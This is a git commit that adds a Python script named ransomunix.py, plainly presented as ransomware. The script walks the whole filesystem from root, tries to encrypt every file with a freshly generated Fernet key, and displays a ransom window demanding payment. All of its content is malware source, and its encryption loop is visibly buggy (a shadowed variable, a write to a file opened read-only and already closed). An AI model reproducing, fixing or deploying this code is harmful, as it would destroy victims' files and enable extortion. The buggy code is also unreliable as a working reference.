79df3500c991b4fa4718017d94c3e44567f5fad2
tintofchaos <77617392+tintofchaos@users.noreply.github.com>
2021-01-18 07:03:42 -0500

    Add files via upload

---
+++ src/unix/ransomunix.py
@@ -0,0 +1,49 @@
+import os
+from cryptography.fernet import Fernet
+import sys
+from PyQt5.QtGui import *
+from PyQt5.QtCore import *
+from PyQt5.QtWidgets import *
+key = Fernet.generate_key()
+
+with open('mykey.key', 'wb') as mykey:
+    mykey.write(key)
+print(key)
+f = Fernet(key)
+files = [None]
+def listdir():
+    return getListOfFiles('/')
+def getListOfFiles(dirName):
+    listOfFile = os.listdir(dirName)
+    allFiles = list()
+    for entry in listOfFile:
+        fullPath = os.path.join(dirName, entry)
+        if os.path.isdir(fullPath):
+            allFiles = allFiles + getListOfFiles(fullPath)
+        else:
+            allFiles.append(fullPath)
+
+    return allFiles
+
+for f in listdir():
+    with open(f, 'rb') as original_file:
+         original = original_file.read()
+
+    encrypted = f.encrypt(original)
+
+    original_file.write(encrypted)
+def window():
+    app = QApplication(sys.argv)
+    widget = QWidget()
+
+    label = QLabel(widget)
+    label.setText("I encrypted all your files to decrypt them pay me X dollars, URL: https://google.com")#google for example
+
+    widget.setWindowTitle("Ransomware")
+    widget.show()
+    widget.setGeometry(80, 80, 600, 400)
+
+    sys.exit(app.exec())
+
+if __name__ == '__main__':
+    window()
